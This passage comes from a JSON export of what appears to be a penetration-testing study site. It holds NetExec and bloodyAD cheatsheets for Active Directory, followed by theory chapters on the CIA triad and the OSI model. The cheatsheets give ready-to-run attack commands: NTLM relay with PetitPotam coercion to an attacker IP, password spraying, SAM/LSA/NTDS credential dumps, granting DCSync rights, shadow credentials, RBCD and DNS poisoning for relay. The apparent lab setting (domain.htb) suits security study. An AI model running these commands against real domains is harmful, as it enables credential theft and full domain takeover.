2. Start ntlmrelayx (another terminal)\nimpacket-ntlmrelayx -tf relay.txt -smb2support -socks\n\n# 3. Trigger coercion\nnxc smb &lt;TARGET&gt; -u U -p P -M petitpotam -o LISTENER=&lt;ATTACKER_IP&gt;\n# or printerbug / coerce_plus / dfscoerce\n</code></pre>\n<hr>\n<h2 id=\"output-logging\">Output &amp; Logging</h2>\n<pre><code class=\"language-bash\"># Verbose\nnxc smb &lt;T&gt; -u U -p P -v         # info\nnxc smb &lt;T&gt; -u U -p P --debug    # full trace\n\n# Save output to file\nnxc smb &lt;T&gt; -u U -p P --shares --log shares.log\n\n# Credential DB (auto-saved in ~/.nxc/workspaces/default/)\nnxc smb --export creds.csv\n</code></pre>\n<hr>\n<h2 id=\"common-flags\">Common Flags</h2>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-u</code> / <code>-p</code></td>\n<td>Username / password (or file containing list)</td>\n</tr>\n<tr>\n<td><code>-H</code></td>\n<td>NT hash (skip <code>LM:</code> prefix)</td>\n</tr>\n<tr>\n<td><code>-k</code></td>\n<td>Kerberos auth</td>\n</tr>\n<tr>\n<td><code>--local-auth</code></td>\n<td>Local SAM (not AD)</td>\n</tr>\n<tr>\n<td><code>--continue-on-success</code></td>\n<td>Don't stop at first valid — keep spraying</td>\n</tr>\n<tr>\n<td><code>-x</code> / <code>-X</code></td>\n<td>Exec cmd / PowerShell</td>\n</tr>\n<tr>\n<td><code>-M &lt;module&gt;</code> / <code>-o KEY=val</code></td>\n<td>Run module / pass options</td>\n</tr>\n<tr>\n<td><code>-L</code></td>\n<td>List modules for the protocol</td>\n</tr>\n<tr>\n<td><code>--shares</code> / <code>--users</code> / <code>--groups</code> / <code>--pass-pol</code></td>\n<td>Base enumeration toggles</td>\n</tr>\n<tr>\n<td><code>--sam</code> / <code>--lsa</code> / <code>--ntds</code> / <code>--dpapi</code></td>\n<td>Credential dumping (SMB)</td>\n</tr>\n<tr>\n<td><code>--bloodhound --collection All</code></td>\n<td>BloodHound ingest (LDAP)</td>\n</tr>\n<tr>\n<td><code>--gen-relay-list &lt;file&gt;</code></td>\n<td>Emit hosts with SMB signing disabled</td>\n</tr>\n<tr>\n<td><code>--kdcHost</code></td>\n<td>Force specific KDC for Kerberos</td>\n</tr>\n<tr>\n<td><code>--dns-server</code></td>\n<td>Resolver for LDAP/BloodHound when no DNS from attacker</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"recon-flow-starter-playbook\">Recon Flow (starter playbook)</h2>\n<pre><code class=\"language-bash\"># 1. Subnet sweep // signing + versions\nnxc smb 10.10.10.0/24\n\n# 2. NULL/anon recon\nnxc smb &lt;DC&gt; -u '' -p '' --shares --users --pass-pol --rid-brute\n\n# 3. With first creds → spray entire domain to find hash reuse\nnxc smb &lt;DC&gt; -u users.txt -p '&lt;FOUND_PW&gt;' --continue-on-success\n\n# 4. LDAP deep enum + BloodHound\nnxc ldap &lt;DC&gt; -u U -p P --users --groups --asreproast r.h --kerberoasting k.h\nnxc ldap &lt;DC&gt; -u U -p P --bloodhound --collection All --dns-server &lt;DC&gt;\n\n# 5. Privilege check on every host in the domain\nnxc smb hosts.txt -u U -p P             # Pwn3d! = local admin\nnxc winrm hosts.txt -u U -p P           # WinRM access\nnxc mssql hosts.txt -u U -p P           # MSSQL access\n\n# 6. Dump where admin\nnxc smb &lt;ADMIN_HOST&gt; -u U -p P --sam --lsa\nnxc smb &lt;DC&gt; -u U -p P --ntds           # if DCSync\n</code></pre>",
      "snippet_body": "# 1. Subnet sweep // signing + versions\nnxc smb 10.10.10.0/24\n\n# 2. NULL/anon recon\nnxc smb <DC> -u '' -p '' --shares --users --pass-pol --rid-brute\n\n# 3. With first creds → spray entire domain to find hash reuse\nnxc smb <DC> -u users.txt -p '<FOUND_PW>' --continue-on-success\n\n# 4. LDAP deep enum + BloodHound\nnxc ldap <DC> -u U -p P --users --groups --asreproast r.h --kerberoasting k.h\nnxc ldap <DC> -u U -p P --bloodhound --collection All --dns-server <DC>\n\n# 5. Privilege check on every host in the domain\nnxc smb hosts.txt -u U -p P             # Pwn3d! = local admin\nnxc winrm hosts.txt -u U -p P           # WinRM access\nnxc mssql hosts.txt -u U -p P           # MSSQL access\n\n# 6. Dump where admin\nnxc smb <ADMIN_HOST> -u U -p P --sam --lsa\nnxc smb <DC> -u U -p P --ntds           # if DCSync"
    },
    {
      "title": "bloodyAD // Cheatsheet",
      "slug": "bloodyad-cheatsheet",
      "date": "",
      "tags": [],
      "desc": "Active Directory privilege escalation and object manipulation via LDAP. Binary: /usr/bin/bloodyAD",
      "body": "<h1 id=\"bloodyad-cheatsheet\">bloodyAD // Cheatsheet</h1>\n<blockquote>\n<p>Active Directory privilege escalation and object manipulation via LDAP.\nBinary: <code>/usr/bin/bloodyAD</code></p>\n</blockquote>\n<h2 id=\"connection-syntax\">Connection Syntax</h2>\n<pre><code class=\"language-bash\"># Base syntax\nbloodyAD --host &lt;DC_IP&gt; -d &lt;DOMAIN&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' &lt;command&gt;\n\n# With Kerberos\nbloodyAD --host &lt;DC_IP&gt; -d &lt;DOMAIN&gt; -k &lt;command&gt;\n\n# LDAPS (port 636)\nbloodyAD --host &lt;DC_IP&gt; -d &lt;DOMAIN&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --secure &lt;command&gt;\n</code></pre>\n<hr>\n<h2 id=\"enumeration-get\">Enumeration (get)</h2>\n<h3 id=\"objects-attributes\">Objects &amp; Attributes</h3>\n<pre><code class=\"language-bash\"># Get all attributes of an object\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;TARGET&gt;' --attr '*'\n\n# Get specific attribute\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;TARGET&gt;' --attr memberOf\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;TARGET&gt;' --attr ms-mcs-admpwd\n\n# Get group members\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;GROUP&gt;' --attr member\n\n# Get object SID\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;TARGET&gt;' --attr objectSid\n</code></pre>\n<h3 id=\"acl-permissions\">ACL &amp; Permissions</h3>\n<pre><code class=\"language-bash\"># List writable objects for current user (key for privesc!)\nbloodyAD --host DC -d domain.htb -u USER -p PASS get writable\n\n# Detailed writable objects (shows permission type)\nbloodyAD --host DC -d domain.htb -u USER -p PASS get writable --detail\n\n# Get DACL of a specific object\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;TARGET&gt;' --attr nTSecurityDescriptor\n</code></pre>\n<h3 id=\"domain-info\">Domain Info</h3>\n<pre><code class=\"language-bash\"># Get domain functional level\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object 'DC=domain,DC=htb' --attr msDS-Behavior-Version\n\n# Get domain password policy\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object 'DC=domain,DC=htb' --attr minPwdLength,lockoutThreshold,lockoutDuration\n</code></pre>\n<hr>\n<h2 id=\"acl-abuse-set-add\">ACL Abuse (set / add)</h2>\n<h3 id=\"take-ownership\">Take Ownership</h3>\n<pre><code class=\"language-bash\"># Take ownership of an object (requires WriteOwner)\nbloodyAD --host DC -d domain.htb -u USER -p PASS set owner '&lt;TARGET_DN&gt;' '&lt;NEW_OWNER&gt;'\n\n# Example: take ownership of a group\nbloodyAD --host DC -d domain.htb -u USER -p PASS set owner 'CN=Target Group,CN=Users,DC=domain,DC=htb' 'JDgodd'\n</code></pre>\n<h3 id=\"modify-dacl-grant-permissions\">Modify DACL (Grant Permissions)</h3>\n<pre><code class=\"language-bash\"># Grant GenericAll on an object (requires WriteDacl)\nbloodyAD --host DC -d domain.htb -u USER -p PASS add genericAll '&lt;TARGET_DN&gt;' '&lt;PRINCIPAL&gt;'\n\n# Grant DCSync rights (requires WriteDacl on domain root)\nbloodyAD --host DC -d domain.htb -u USER -p PASS add dcsync '&lt;USER&gt;'\n</code></pre>\n<h3 id=\"group-membership\">Group Membership</h3>\n<pre><code class=\"language-bash\"># Add user to a group (requires GenericAll/GenericWrite/WriteMember on group)\nbloodyAD --host DC -d domain.htb -u USER -p PASS add groupMember '&lt;GROUP&gt;' '&lt;USER&gt;'\n\n# Remove user from a group\nbloodyAD --host DC -d domain.htb -u USER -p PASS remove groupMember '&lt;GROUP&gt;' '&lt;USER&gt;'\n</code></pre>\n<hr>\n<h2 id=\"privilege-escalation-chains\">Privilege Escalation Chains</h2>\n<h3 id=\"writeowner-genericall-group-membership\">WriteOwner → GenericAll → Group Membership</h3>\n<pre><code class=\"language-bash\"># 1. Take ownership\nbloodyAD --host DC -d domain.htb -u USER -p PASS set owner '&lt;GROUP_DN&gt;' '&lt;USER&gt;'\n\n# 2. Grant yourself GenericAll\nbloodyAD --host DC -d domain.htb -u USER -p PASS add genericAll '&lt;GROUP_DN&gt;' '&lt;USER&gt;'\n\n# 3. Add yourself to the group\nbloodyAD --host DC -d domain.htb -u USER -p PASS add groupMember '&lt;GROUP&gt;' '&lt;USER&gt;'\n</code></pre>\n<h3 id=\"writedacl-dcsync\">WriteDacl → DCSync</h3>\n<pre><code class=\"language-bash\"># 1. Grant DCSync rights\nbloodyAD --host DC -d domain.htb -u USER -p PASS add dcsync '&lt;USER&gt;'\n\n# 2. DCSync with impacket\nimpacket-secretsdump '&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;DC&gt;'\n</code></pre>\n<h3 id=\"genericwrite-shadow-credentials\">GenericWrite → Shadow Credentials</h3>\n<pre><code class=\"language-bash\"># Add shadow credentials (requires GenericWrite on target user)\nbloodyAD --host DC -d domain.htb -u USER -p PASS add shadowCredentials '&lt;TARGET_USER&gt;'\n</code></pre>\n<h3 id=\"genericwrite-rbcd-resource-based-constrained-delegation\">GenericWrite → RBCD (Resource-Based Constrained Delegation)</h3>\n<pre><code class=\"language-bash\"># Set RBCD on target machine\nbloodyAD --host DC -d domain.htb -u USER -p PASS add rbcd '&lt;TARGET_MACHINE$&gt;' '&lt;CONTROLLED_MACHINE$&gt;'\n</code></pre>\n<hr>\n<h2 id=\"password-operations\">Password Operations</h2>\n<pre><code class=\"language-bash\"># Change user password (requires GenericAll or User-Force-Change-Password)\nbloodyAD --host DC -d domain.htb -u USER -p PASS set password '&lt;TARGET_USER&gt;' '&lt;NEW_PASSWORD&gt;'\n</code></pre>\n<hr>\n<h2 id=\"ad-integrated-dns-add-modify-remove-records\">AD-Integrated DNS (add / modify / remove records)</h2>\n<blockquote>\n<p>In AD, DNS zones live as LDAP containers under <code>CN=MicrosoftDNS,DC=DomainDnsZones,...</code>.\nBy default <strong>Authenticated Users</strong> can create new records (<code>CreateChild</code>) — useful for\nresponder relay, subdomain takeover of PKI/AutoDiscover, WPAD hijack.</p>\n</blockquote>\n<h3 id=\"enumerate\">Enumerate</h3>\n<pre><code class=\"language-bash\"># Dump all records the user can read (attribute dnsRecord)\nbloodyAD --host DC -d domain.htb -u USER -p PASS get dnsDump\n\n# Filter\nbloodyAD --host DC -d domain.htb -u USER -p PASS get dnsDump | grep -iE '^recordName|web|intranet'\n</code></pre>\n<p><strong>Gotcha</strong>: hidden records. The default ACL lets you LIST children (see the names) but\nnot always READ the <code>dnsRecord</code> value. If <code>get dnsDump</code> looks sparse, try\n<code>adidnsdump</code> (separate tool) — it discovers nodes by listing children even without\nread on the attribute.</p>\n<h3 id=\"add\">Add</h3>\n<pre><code class=\"language-bash\"># Single-label name (bloodyAD appends the zone). Default type = A\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord '&lt;name&gt;' '&lt;ip_or_target&gt;'\n\n# Example // point webattacker.domain.htb to your attacker IP\nbloodyAD --host dc.domain.htb -d domain.htb -u USER -p PASS \\\n  add dnsRecord 'webattacker' '10.10.14.42'\n\n# Non-A types\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord 'evil' 'attacker.domain.htb' --dnstype CNAME\n\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord '_kerberos._tcp.fakesite' 'attacker.domain.htb' \\\n  --dnstype SRV --port 88 --priority 0 --preference 100\n</code></pre>\n<p><strong>Pitfalls</strong>:\n- <strong>Name must be a single label</strong> (no dots). <code>'web.evil.domain.htb'</code> tries to create\n  a multi-level node → <code>attributeOrValueExists</code> or phantom subdomain.\n- If a record with that name already exists, bloodyAD does a REPLACE — it will\n  fail with <code>attributeOrValueExists</code> if the NEW value equals an existing one.</p>\n<h3 id=\"modify-replace\">Modify / Replace</h3>\n<pre><code class=\"language-bash\"># Same command // bloodyAD detects existing node and replaces the dnsRecord attr\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord '&lt;name&gt;' '&lt;new_ip&gt;'\n</code></pre>\n<h3 id=\"remove\">Remove</h3>\n<pre><code class=\"language-bash\">bloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  remove dnsRecord '&lt;name&gt;'\n</code></pre>\n<h3 id=\"verify\">Verify</h3>\n<pre><code class=\"language-bash\"># Protocol-level (ignores LDAP ACLs)\ndig @&lt;DC_IP&gt; +short &lt;name&gt;.&lt;zone&gt;\n\n# LDAP-level (shows only what the current user can read)\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  get dnsDump | grep -A1 -i '&lt;name&gt;'\n</code></pre>\n<h3 id=\"typical-attack-flow\">Typical attack flow</h3>\n<pre><code class=\"language-bash\"># 1. Attacker listener up first\nsudo responder -I tun0 -wv           # or ntlmrelayx for auto-relay\n\n# 2. Add record pointing to your tun0\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord 'webattacker' '10.10.14.42'\n\n# 3. Propagation check\ndig @&lt;DC_IP&gt; +short webattacker.domain.htb\n\n# 4. Wait for the trigger (scheduled script / client cache miss / SCCM probe)\n# 5. Clean up after shell\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  remove dnsRecord 'webattacker'\n</code></pre>\n<hr>\n<h2 id=\"laps\">LAPS</h2>\n<pre><code class=\"language-bash\"># Read LAPS password (requires ReadLAPSPassword on computer object)\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;COMPUTER$&gt;' --attr ms-mcs-admpwd\n\n# LAPS v2\nbloodyAD --host DC -d domain.htb -u USER -p PASS get object '&lt;COMPUTER$&gt;' --attr msLAPS-Password\n</code></pre>\n<hr>\n<h2 id=\"kerberos-attacks\">Kerberos Attacks</h2>\n<pre><code class=\"language-bash\"># Set SPN on a user (Kerberoasting setup, requires GenericWrite)\nbloodyAD --host DC -d domain.htb -u USER -p PASS set object '&lt;TARGET_USER&gt;' servicePrincipalName -v 'HTTP/fake.domain.htb'\n\n# Disable pre-authentication (ASREPRoast setup)\nbloodyAD --host DC -d domain.htb -u USER -p PASS add uac '&lt;TARGET_USER&gt;' -f DONT_REQ_PREAUTH\n</code></pre>\n<hr>\n<h2 id=\"cleanup\">Cleanup</h2>\n<pre><code class=\"language-bash\"># Remove GenericAll\nbloodyAD --host DC -d domain.htb -u USER -p PASS remove genericAll '&lt;TARGET_DN&gt;' '&lt;PRINCIPAL&gt;'\n\n# Remove from group\nbloodyAD --host DC -d domain.htb -u USER -p PASS remove groupMember '&lt;GROUP&gt;' '&lt;USER&gt;'\n\n# Remove shadow credentials\nbloodyAD --host DC -d domain.htb -u USER -p PASS remove shadowCredentials '&lt;TARGET_USER&gt;'\n\n# Remove RBCD\nbloodyAD --host DC -d domain.htb -u USER -p PASS remove rbcd '&lt;TARGET_MACHINE$&gt;' '&lt;CONTROLLED_MACHINE$&gt;'\n</code></pre>\n<hr>\n<h2 id=\"common-flags\">Common Flags</h2>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>--host</code></td>\n<td>Domain Controller IP or hostname</td>\n</tr>\n<tr>\n<td><code>-d</code></td>\n<td>Domain name</td>\n</tr>\n<tr>\n<td><code>-u</code></td>\n<td>Username</td>\n</tr>\n<tr>\n<td><code>-p</code></td>\n<td>Password</td>\n</tr>\n<tr>\n<td><code>-k</code></td>\n<td>Use Kerberos authentication</td>\n</tr>\n<tr>\n<td><code>--secure</code></td>\n<td>Use LDAPS (port 636)</td>\n</tr>\n<tr>\n<td><code>--dc-ip</code></td>\n<td>Alias for --host in some versions</td>\n</tr>\n</tbody>\n</table>",
      "snippet_body": "# Single-label name (bloodyAD appends the zone). Default type = A\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord '<name>' '<ip_or_target>'\n\n# Example // point webattacker.domain.htb to your attacker IP\nbloodyAD --host dc.domain.htb -d domain.htb -u USER -p PASS \\\n  add dnsRecord 'webattacker' '10.10.14.42'\n\n# Non-A types\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord 'evil' 'attacker.domain.htb' --dnstype CNAME\n\nbloodyAD --host DC -d domain.htb -u USER -p PASS \\\n  add dnsRecord '_kerberos._tcp.fakesite' 'attacker.domain.htb' \\\n  --dnstype SRV --port 88 --priority 0 --preference 100"
    }
  ],
  "fundamentals": [
    {
      "title": "Principles of Security",
      "slug": "principles-of-security",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "theory",
        "cia",
        "aaa"
      ],
      "desc": "Security is not a feature you bolt on — it is a set of properties a system must continuously guarantee about its data and users. The classical model, the CIA triad, defines those properties.",
      "body": "<h1 id=\"principles-of-security\">Principles of Security</h1>\n<p>Security is not a feature you bolt on — it is a set of properties a system must continuously guarantee about its data and users. The classical model, the <strong>CIA triad</strong>, defines those properties.</p>\n<h2 id=\"the-cia-triad\">The CIA triad</h2>\n<ul>\n<li><strong>Confidentiality</strong> — only authorised parties can read the data. Enforced by access control, encryption, and isolation. A password leak is a confidentiality failure.</li>\n<li><strong>Integrity</strong> — data cannot be altered (in transit or at rest) without detection. Enforced by hashes, MACs, digital signatures, transactional databases. Tampering with a wire transfer in flight is an integrity failure.</li>\n<li><strong>Availability</strong> — the system responds to legitimate requests on time. Enforced by redundancy, capacity, rate limiting, and incident response. A successful DDoS is an availability failure.</li>\n</ul>\n<p>The triad is a <em>checklist</em>: every defensive choice should serve at least one leg.</p>\n<h2 id=\"aaa-the-operational-triad\">AAA // the operational triad</h2>\n<p>CIA tells you <em>what</em> to protect; AAA tells you <em>how</em> to enforce it on every request.</p>\n<ul>\n<li><strong>Authentication</strong> — proving <em>who</em> you are (knowledge, possession, inherence).</li>\n<li><strong>Authorisation</strong> — deciding <em>what</em> you may do once authenticated.</li>\n<li><strong>Accounting / Auditing</strong> — recording what was done, so violations can be detected after the fact.</li>\n</ul>\n<p>Auth attacks usually exploit a gap between these three (e.g. an authorisation check that runs on the client only, an audit log that an attacker can wipe).</p>\n<h2 id=\"security-models\">Security models</h2>\n<p>A <em>security model</em> formalises how subjects (users) interact with objects (data) at different sensitivity levels.</p>\n<h3 id=\"belllapadula\">Bell–LaPadula</h3>\n<p>Designed for <strong>confidentiality</strong> in military contexts. Two rules:</p>\n<ul>\n<li><strong>No read-up</strong> (a <em>Secret</em> user cannot read <em>Top-Secret</em> data).</li>\n<li><strong>No write-down</strong> (a <em>Top-Secret</em> user cannot write into a <em>Secret</em> document, to prevent leaking through downward channels).</li>\n</ul>\n<p>Strength: simple, mirrors classification systems. Weakness: it protects content but not metadata — a <em>Secret</em> user may still infer the <em>existence</em> of <em>Top-Secret</em> data, and the model says nothing about integrity.</p>\n<h3 id=\"biba\">Biba</h3>\n<p>The mirror image of Bell–LaPadula, designed for <strong>integrity</strong>.</p>\n<ul>\n<li><strong>No read-down</strong> (a high-integrity process cannot consume low-integrity data — preventing corruption from below).</li>\n<li><strong>No write-up</strong> (a low-integrity process cannot modify high-integrity data).</li>\n</ul>\n<p>Useful in environments where trusted code must not be polluted by untrusted input, e.g. an application server that should never read from a developer-writable scratch directory.</p>\n<h3 id=\"clarkwilson\">Clark–Wilson</h3>\n<p>A commercial-grade integrity model: transactions must go through <em>well-formed</em> programs that enforce <em>separation of duties</em>. Modern bank software follows it implicitly — no single operator can both create and approve a transfer.</p>\n<h2 id=\"principle-of-least-privilege\">Principle of least privilege</h2>\n<p>Every subject — user, service account, process — should hold <em>only</em> the permissions strictly necessary to do its job, <em>only</em> for the time needed.</p>\n<p>In practice this means:</p>\n<ul>\n<li>service accounts run without interactive shell rights;</li>\n<li>production credentials are short-lived;</li>\n<li>admin rights are elevated for one task and dropped immediately afterwards.</li>\n</ul>\n<p>A breach contained by least privilege is a small breach; the same breach without it pivots to the whole estate.</p>\n<h2 id=\"defence-in-depth\">Defence in depth</h2>\n<p>Assume any single control will fail. Stack independent layers so the cost of bypassing all of them exceeds the value of the asset:</p>\n<pre><code>Perimeter (firewall, WAF)\n   ↓\nNetwork (segmentation, mTLS)\n   ↓\nHost (hardening, EDR)\n   ↓\nApp (input validation, AuthZ checks)\n   ↓\nData (encryption at rest, RLS)\n</code></pre>\n<p>The defender wins when the attacker has to break <em>all</em> layers; the attacker wins when one layer is treated as sufficient.</p>\n<h2 id=\"threat-modelling-a-short-note\">Threat modelling // a short note</h2>\n<p>Before applying any of the above, ask the four questions of [STRIDE / PASTA]:</p>\n<ol>\n<li><em>What are we building?</em></li>\n<li><em>What can go wrong?</em></li>\n<li><em>What are we going to do about it?</em></li>\n<li><em>Did we do a good enough job?</em></li>\n</ol>\n<p>Threat modelling is the cheapest control there is. Doing it before code exists turns CIA from an aspiration into a design constraint.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Network — OSI Model & Encapsulation",
      "slug": "network-osi-model-encapsulation",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "network",
        "osi",
        "theory"
      ],
      "desc": "Networking is a layered system: each layer hides the complexity of the one below and exposes a clean interface to the one above. Understanding the layering — and the encapsulation that implements it — is what lets you reason about where a vulnerability lives, which defence…",
      "body": "<h1 id=\"osi-model-encapsulation\">OSI Model &amp; Encapsulation</h1>\n<p>Networking is a layered system: each layer hides the complexity of the one below and exposes a clean interface to the one above. Understanding the layering — and the <em>encapsulation</em> that implements it — is what lets you reason about <em>where</em> a vulnerability lives, <em>which</em> defence stops it, and <em>which</em> tools speak the right language to investigate it.</p>\n<p>The model that most teaching uses is the <strong>OSI 7-layer</strong> model; the model the internet actually runs on is the <strong>TCP/IP 4-layer</strong> model. They map to each other roughly. OSI gives you the vocabulary; TCP/IP describes the deployed reality.</p>\n<h2 id=\"the-layers\">The layers</h2>\n<table>\n<thead>\n<tr>\n<th>OSI</th>\n<th>TCP/IP</th>\n<th>Examples</th>\n<th>Address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>7 — Application</td>\n<td>Application</td>\n<td>HTTP, SMTP, DNS, SSH</td>\n<td>URL, hostname</td>\n</tr>\n<tr>\n<td>6 — Presentation</td>\n<td>Application</td>\n<td>TLS, MIME, gzip</td>\n<td>—</td>\n</tr>\n<tr>\n<td>5 — Session</td>\n<td>Application</td>\n<td>SOCKS, NetBIOS</td>\n<td>—</td>\n</tr>\n<tr>\n<td>4 — Transport</td>\n<td>Transport</td>\n<td>TCP, UDP, QUIC</td>\n<td>port</td>\n</tr>\n<tr>\n<td>3 — Network</td>\n<td>Internet</td>\n<td>IPv4, IPv6, ICMP</td>\n<td>IP address</td>\n</tr>\n<tr>\n<td>2 — Data Link</td>\n<td>Link</td>\n<td>Ethernet, ARP, 802.11</td>\n<td>MAC address</td>\n</tr>\n<tr>\n<td>1 — Physical</td>\n<td>Link</td>\n<td>cable, radio, fibre</td>\n<td>—</td>\n</tr>\n</tbody>\n</table>\n<p>Each layer has its own <em>protocol data unit</em> (PDU): bits at L1, frames at L2, packets at L3, segments at L4, \"messages\" at L7.</p>\n<h2 id=\"encapsulation-the-engine-of-the-layering\">Encapsulation // the engine of the layering</h2>\n<p>When an application sends data, each layer wraps the layer above with its own header:</p>\n<pre><code>L7  Application data            ←  what the user typed\n    │\nL4  [TCP header] [data]         ←  add ports, sequence, flags\n    │\nL3  [IP header] [TCP] [data]    ←  add source/dest IP, TTL\n    │\nL2  [Eth header] [IP] [TCP] [data] [Eth trailer]   ←  add MACs, CRC\n    │\nL1  electrical / optical / RF signals\n</code></pre>\n<p>At the receiver, each layer <em>unwraps</em> its own header and hands the inner payload upward. Routers operate at L3 — they inspect the IP header, decide the next hop, and re-frame at L2 for the next link, but never look at the TCP segment inside. Switches operate at L2 — MAC tables only. Firewalls historically operated at L3/L4 (5-tuple: src IP, dst IP, src port, dst port, protocol); modern <em>application firewalls</em> (WAFs) operate at L7.</p>\n<p>This is why an L3 firewall rule cannot stop SQL injection (it doesn't read the HTTP body) and why an L7 WAF cannot stop a SYN flood (the flood never gets past L4 setup).</p>\n<h2 id=\"where-each-attack-class-lives\">Where each attack class lives</h2>\n<p>Knowing the layer pins the toolset:</p>\n<ul>\n<li><strong>L1 (Physical)</strong> — cable taps, side-channel (TEMPEST), radio-frequency jamming. Out of scope for software people, very real for red teams with physical access.</li>\n<li><strong>L2 (Data Link)</strong> — <strong>ARP spoofing</strong> (poisoning the local segment's IP↔MAC mapping to MITM traffic), MAC flooding (filling a switch's CAM table so it falls back to hub mode), VLAN hopping. Defence is on the switch (port security, dynamic ARP inspection).</li>\n<li><strong>L3 (Network)</strong> — IP spoofing, ICMP redirect attacks, routing-protocol abuse (BGP hijack, OSPF). DDoS that targets IP infrastructure. Defence: ingress/egress filtering (BCP 38), routing authentication.</li>\n<li><strong>L4 (Transport)</strong> — <strong>SYN flood</strong> (exhaust the half-open connection table by initiating handshakes and not completing them), TCP reset attacks (forge a RST to drop someone else's session), port scanning. Defence: SYN cookies, rate limiting, stateful inspection.</li>\n<li><strong>L5–L6</strong> — usually folded into L7 in practice. TLS lives here in OSI terms; TLS attacks (POODLE, Heartbleed, downgrade) are conceptually at L6.</li>\n<li><strong>L7 (Application)</strong> — everything above this article: SQL injection, XSS, SSRF, broken auth, deserialisation. Defence: at the application code.</li>\n</ul>\n<p>When someone asks \"is this an OSI L3 problem or an L7 problem?\", they are asking \"does the attack happen before or after the receiving system has read the application payload?\". The answer determines who owns the fix.</p>\n<h2 id=\"tcp-vs-udp-a-30-second-comparison\">TCP vs UDP // a 30-second comparison</h2>\n<p>Both live at L4, both use IP underneath, both expose ports.</p>\n<ul>\n<li><strong>TCP</strong> is <em>connection-oriented</em>: 3-way handshake (SYN → SYN-ACK → ACK) establishes a session, sequence numbers detect loss and reorder, acknowledgements drive retransmission. Reliable, ordered, slower. Used by HTTP, SSH, SMTP, FTP control, DB protocols.</li>\n<li><strong>UDP</strong> is <em>connectionless</em>: send-and-forget datagrams. No handshake, no retransmission, no order guarantee. Fast and stateless. Used by DNS, NTP, DHCP, syslog, most video/audio streaming, QUIC (which adds reliability on top of UDP in userland).</li>\n</ul>\n<p>TCP's handshake is what makes SYN flood meaningful (state on the server before authentication). UDP's statelessness is what makes UDP-amplification DDoS so effective (small spoofed request, large response sent to the victim).</p>\n<h2 id=\"why-encapsulation-matters-operationally\">Why encapsulation matters operationally</h2>\n<p>When you see a packet capture:</p>\n<pre><code>Ethernet → IP → TCP → TLS → HTTP/2 → JSON\n</code></pre>\n<p>…you are looking at a stack of envelopes. Each layer's header tells you <em>who wrote it</em>, <em>who reads it next</em>, and <em>how much it knows about the rest</em>. A WAF that parses the TLS-decrypted HTTP/2 stream does not need to know about the Ethernet frame; the TLS terminator does not need to parse the HTTP body. Layering is not just pedagogy — it is the architectural discipline that makes the internet possible to debug.</p>\n<p>Tools speak the language of their layer. <code>tcpdump</code> shows L2–L4; <code>tshark</code>/Wireshark dissects up to L7 for protocols it knows; <code>curl</code> operates at L7. Picking the wrong layer for the question (\"why is HTTP slow?\" answered with <code>iptables</code> rules) is one of the most common time-sinks in operations.</p>\n<h2 id=\"the-osi-model-is-a-map-not-the-territory\">The OSI model is a map, not the territory</h2>\n<p>OSI as drawn is an idealisation. Real protocols don't always fit cleanly into one layer:</p>\n<ul>\n<li>HTTP runs over TCP, but HTTP/3 runs over UDP+QUIC — same L7, different transport.</li>\n<li>TLS conceptually spans L5/L6, in practice acts as a layer between L4 and the application.</li>\n<li>SSH provides L7 application <em>and</em> its own session/transport encryption.</li>\n<li>VPNs (IPsec at L3, OpenVPN/WireGuard at L4) tunnel one layer inside another.</li>\n</ul>\n<p>The lesson is to use the model as a <em>reasoning aid</em>, not a strict taxonomy. The valuable bit is \"where in the stack is this thing happening, and what does that imply about who can see it, who can intervene, and how the fix has to be designed\".</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Network — Reconnaissance",
      "slug": "network-reconnaissance",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "network",
        "recon",
        "osint",
        "theory"
      ],
      "desc": "Reconnaissance is the first phase of every offensive engagement and the most underrated. It is also where the attacker–defender asymmetry is at its sharpest: the defender has to know everything they expose; the attacker only has to find one forgotten thing.",
